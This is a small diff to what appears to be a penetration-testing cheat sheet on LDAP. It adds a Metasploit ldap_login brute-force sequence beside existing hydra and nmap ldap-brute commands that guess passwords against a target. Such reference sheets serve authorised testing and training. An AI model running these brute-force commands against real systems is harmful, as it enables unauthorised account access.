@@ -247,3 +247,12 @@ hydra -L users.txt -P passwords.txt <IP> ldap2 -s 389
 ```
 nmap -p 389 --script ldap-brute --script-args ldap.base='"DC=example,DC=local"' <IP>
 ```
+
+### Metasploit
+```
+use auxiliary/scanner/ldap/ldap_login
+set RHOSTS target.com
+set USERNAME admin
+set PASS_FILE passwords.txt
+run
+```
